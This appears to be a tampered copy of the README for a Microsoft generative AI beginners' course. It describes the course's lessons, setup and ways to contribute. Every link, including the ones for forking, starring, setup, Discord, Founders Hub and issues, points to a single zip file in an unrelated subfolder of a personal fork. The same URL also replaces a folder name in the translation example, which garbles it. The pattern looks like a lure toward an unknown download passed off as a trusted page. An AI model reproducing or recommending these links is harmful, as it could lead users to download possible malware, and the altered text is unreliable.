# Generative AI for Beginners - A Course 

Learn the fundamentals of building Generative AI applications with our 12-lesson comprehensive course by Microsoft Cloud Advocates. Each lesson covers a key aspect of Generative AI principles and application development. Throughout this course, we will be building our own Generative AI startup so you can get an understanding of what it takes to launch your ideas. 

## 🌱 Getting Started

To get started, [fork this entire repo](https://raw.githubusercontent.com/Tanikai-Ganesh/generative-ai-for-beginners/main/09-building-image-applications/translations/cn/generative-ai-for-beginners_v2.5.zip) to your own GitHub account to be able to change any code and complete the challenges. You can also [star (🌟) this repo](https://raw.githubusercontent.com/Tanikai-Ganesh/generative-ai-for-beginners/main/09-building-image-applications/translations/cn/generative-ai-for-beginners_v2.5.zip) to find it easier later.

Below are the links to each lesson. Feel free to explore and start at any lesson that interests you the most! 

Head to the [Course Setup Page](https://raw.githubusercontent.com/Tanikai-Ganesh/generative-ai-for-beginners/main/09-building-image-applications/translations/cn/generative-ai-for-beginners_v2.5.zip) to find the setup guide that works best for you. 

## 🗣️ Meet Other Learners, Get Support 

We believe one of the best ways to learn is learning with others! Join our [official AI Discord server](https://raw.githubusercontent.com/Tanikai-Ganesh/generative-ai-for-beginners/main/09-building-image-applications/translations/cn/generative-ai-for-beginners_v2.5.zip) to meet and network with other learners taking this course and get support. Who knows? You might find your next co-founder there! 

### 🚀  Are you a startup or got an idea you want to launch? 

Visit [Microsoft's Founders Hub](https://raw.githubusercontent.com/Tanikai-Ganesh/generative-ai-for-beginners/main/09-building-image-applications/translations/cn/generative-ai-for-beginners_v2.5.zip) where you can apply to receive **free OpenAI credits** and up to **$150k towards Azure's leading AI services**. 

## 🙏 Want to help?

Here are ways you can contribute to this course: 
- Find spelling errors or code errors, [Raise an issue](https://raw.githubusercontent.com/Tanikai-Ganesh/generative-ai-for-beginners/main/09-building-image-applications/translations/cn/generative-ai-for-beginners_v2.5.zip) or [Create a pull request](https://raw.githubusercontent.com/Tanikai-Ganesh/generative-ai-for-beginners/main/09-building-image-applications/translations/cn/generative-ai-for-beginners_v2.5.zip)
- Send us your ideas, maybe your ideas for new lessons or exercises, and let us know how we can improve.
- Translate to your language, every chapter has a *translations* subdirectory, if you want to help with this one create the following structure:

```text
  Chapter NN/
    translations
      es/          <== your language code
       https://raw.githubusercontent.com/Tanikai-Ganesh/generative-ai-for-beginners/main/09-building-image-applications/translations/cn/generative-ai-for-beginners_v2.5.zip   <== your translation
```

## 📂 Each lesson includes:

- a short video introduction to the topic
- written lesson located in the README 
- for project-based lessons, a Jupyter Notebook with code examples 
- a challenge or assignment to apply your learning 
- links to extra resources to continue your learning
